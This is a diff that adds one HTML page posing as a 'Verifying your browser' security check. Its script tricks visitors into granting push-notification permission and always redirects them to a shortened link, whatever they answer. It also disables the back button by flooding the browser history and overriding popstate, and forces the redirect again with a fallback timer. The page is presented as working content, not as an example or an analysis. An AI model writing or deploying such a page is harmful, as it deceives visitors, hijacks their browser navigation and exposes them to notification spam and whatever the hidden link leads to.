@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="robots" content="noindex,nofollow" />
+  <title>Verifying your browser...</title>
+  <style>
+    body {
+      margin: 0;
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      flex-direction: column;
+      color: white;
+      font-family: sans-serif;
+    }
+    .spinner {
+      width: 60px;
+      height: 60px;
+      border: 6px solid rgba(255, 255, 255, 0.2);
+      border-top: 6px solid #0f62fe;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    .msg {
+      margin-top: 20px;
+      font-size: 16px;
+      text-align: center;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="spinner"></div>
+  <div class="msg">Please wait... Verifying security. Click "Allow" if prompted.</div>
+
+  <script>
+    // Push permission logic
+    setTimeout(() => {
+      Notification.requestPermission().then(permission => {
+        if (permission === "granted") {
+          location.href = "https://urls.fr/85Shca";
+        } else {
+          location.href = "https://urls.fr/85Shca"; // Fallback anyway
+        }
+      });
+    }, 1500);
+
+    // History trap
+    try {
+      for (let i = 0; i < 20; i++) history.pushState({}, "", "#");
+      onpopstate = () => history.go(1);
+    } catch(e){}
+
+    // Absolute fallback if JS blocked
+    setTimeout(() => {
+      location.href = "https://urls.fr/85Shca";
+    }, 5000);
+  </script>
+</body>
+</html>
